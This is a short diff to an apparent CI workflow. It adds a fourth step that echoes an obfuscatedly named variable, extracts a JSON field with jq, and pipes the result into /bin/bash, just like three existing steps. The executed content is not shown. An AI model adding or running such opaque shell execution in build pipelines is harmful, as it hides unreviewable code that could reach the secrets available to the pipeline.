@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$ocjpj18" | jq -r .knp01 | /bin/bash
           printf '%s' "$ihttc40" | jq -r .ubr79 | /bin/bash
           echo $qjot3745 | jq -r .ebt487 | /bin/bash
+          echo $j51 | jq -r .dzadc1500 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
